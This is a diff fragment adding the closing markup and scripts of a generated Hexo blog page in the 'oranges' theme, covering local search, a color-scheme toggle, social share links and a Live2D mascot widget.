+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' +  + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F05%2F01%2F%25E4%25B8%2580%25E6%25AC%25A1amf%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E7%25BB%2595waf%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/05/01/%E4%B8%80%E6%AC%A1amf%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95waf/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
